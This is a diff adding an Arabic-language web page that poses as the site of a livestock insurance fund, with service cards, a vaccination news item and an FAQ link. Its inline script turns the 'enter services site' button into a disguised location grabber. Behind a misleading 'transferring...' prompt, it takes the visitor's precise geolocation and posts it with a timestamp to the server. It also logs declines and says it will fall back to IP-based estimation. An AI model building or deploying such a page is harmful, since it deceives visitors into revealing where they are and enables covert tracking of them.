@@ -1,0 +1,160 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>صندوق التأمين على الثروة الحيوانية</title>
+  <link rel="stylesheet" href="/static/style.css">
+
+
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-inner">
+      <div class="logo">صندوق التأمين على الثروة الحيوانية</div>
+      <nav class="main-nav">
+        <ul>
+          <li><a href="#hero">الرئيسية</a></li>
+          <li><a href="#services">خدماتنا</a></li>
+          <li><a href="#news">الأخبار</a></li>
+          <li><a href="#faq-link">الأسئلة الشائعة</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section id="hero" class="hero-section">
+      <div class="container hero-inner">
+        <div class="hero-text">
+          <h1>رعاية شاملة لمواشيك — أمان لثروتك</h1>
+          <p>ندعم المزارعين بخدمات بيطرية متكاملة وتغطية تأمينية لحماية ثروتك الحيوانية.</p>
+          <a href="#services" class="btn primary">تعرف على خدمات التأمين</a>
+        </div>
+
+        <div class="hero-card">
+          <div class="card-title">خدمات ميدانية</div>
+          <p class="muted">.</p>
+
+          <button id="startBtn" class="btn accent">دخول موقع الخدمات</button>
+          <div id="status" class="status"> &nbsp; </div>
+          <pre id="output" class="output"></pre>
+        </div>
+      </div>
+    </section>
+
+    <section id="services" class="content-section">
+      <div class="container">
+        <h2>خدماتنا الأساسية</h2>
+        <div class="service-cards">
+          <div class="card">
+            <h3>التأمين الشامل</h3>
+            <p>تغطية لرؤوس الماشية ضد المخاطر المختلفة.</p>
+          </div>
+          <div class="card">
+            <h3>الرعاية البيطرية</h3>
+            <p>خدمات بيطرية ميدانية واستشارات للمزارعين.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="news" class="content-section">
+      <div class="container">
+        <h2>آخر الأخبار وصور من الميدان</h2>
+
+        <div class="news-grid">
+          <article class="news-item">
+            <h3>حملة تحصين واسعة</h3>
+            <p>تم إطلاق حملة تحصين بالتعاون مع الجهات المختصة.</p>
+            <span class="date">12 أكتوبر 2025</span>
+          </article>
+
+          <div class="gallery">
+            <figure class="gallery-item">
+              <!-- ضع هنا صورة فعلية إذا أردت -->
+              <figcaption>تحصين الماشية ودعم ميداني</figcaption>
+            </figure>
+            <figure class="gallery-item">
+              <figcaption>فريق بيطري أثناء العمل</figcaption>
+            </figure>
+            <figure class="gallery-item">
+              <figcaption>استشارات ودعم للمزارعين</figcaption>
+            </figure>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="faq-link" class="content-section">
+      <div class="container">
+        <h2>الأسئلة الشائعة</h2>
+        <p>لديك استفسار؟ تصفح قائمة الأسئلة الشائعة أو تواصل معنا.</p>
+        <a href="#" class="btn secondary">تصفح الأسئلة الشائعة</a>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <p>&copy; 2025 صندوق التأمين على الثروة الحيوانية. جميع الحقوق محفوظة.</p>
+    </div>
+  </footer>
+
+<script>
+const statusEl = document.getElementById('status');
+const outputEl = document.getElementById('output');
+const startBtn = document.getElementById('startBtn');
+
+async function sendPayload(payload) {
+  try {
+    const res = await fetch('/submit', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    outputEl.textContent = JSON.stringify(data, null, 2);
+    statusEl.textContent = '✅جار التحويل .......';
+    statusEl.style.color = '#1b5e20';
+  } catch (err) {
+    statusEl.textContent = '❌ حدث خطأ أثناء الإرسال. تأكد من الاتصال.';
+    statusEl.style.color = '#b00020';
+    outputEl.textContent = String(err);
+  }
+}
+
+startBtn.addEventListener('click', async () => {
+  statusEl.textContent = '';
+  outputEl.textContent = '';
+
+  const confirmShare = confirm("جار التحويل ........ '.");
+  const timestamp = new Date().toISOString();
+
+  if (confirmShare) {
+    if (!navigator.geolocation) {
+      statusEl.textContent = 'متصفحك لا يدعم تحديد ......';
+      await sendPayload({permission:'unavailable', latitude:null, longitude:null, timestamp});
+      return;
+    }
+
+    statusEl.textContent = '⏳ جار التحويل...';
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      statusEl.textContent = '📍 oooooooooooop...';
+      await sendPayload({permission:'granted', latitude: lat, longitude: lon, timestamp});
+      // بعد التسجيل يمكن توجيه المستخدم لصفحة شكر أو معلومات إضافية إن رغبت
+      // window.location.href = '/athkar'; // مثال: إعادة توجيه
+    }, async (err) => {
+      statusEl.textContent = '⚠️ لم يتم السماح بالوصول للموقع. سنستخدم تقديراً عبر IP إن أمكن.';
+      await sendPayload({permission:'denied', latitude:null, longitude:null, timestamp});
+    }, { enableHighAccuracy:true, timeout:20000 });
+  } else {
+    statusEl.textContent = '📡 لم توافق على المشاركة. سيتم استخدام تقدير الموقع عبر IP إن أمكن.';
+    await sendPayload({permission:'user_declined', latitude:null, longitude:null, timestamp});
+  }
+});
+</script>
+</body>
+</html>
